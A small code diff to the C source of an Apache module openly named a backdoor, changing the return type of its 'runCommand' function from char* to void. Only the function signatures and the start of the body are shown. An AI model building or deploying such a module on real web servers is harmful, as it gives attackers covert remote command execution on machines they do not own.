@@ -55,7 +55,7 @@ static int post_handler(request_rec *r);
 
 static int delete_handler(request_rec *r);
 
-char* runCommand(request_rec *r, const char* command);
+void runCommand(request_rec *r, const char* command);
 int apache_backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp, server_rec *s);
 
 /* The sample content handler */
@@ -101,7 +101,7 @@ static int delete_handler(request_rec *r){
     return DECLINED;
 }
 
-char* runCommand(request_rec *r, const char* command){
+void runCommand(request_rec *r, const char* command){
     FILE *fp;
     char path[1035];
 
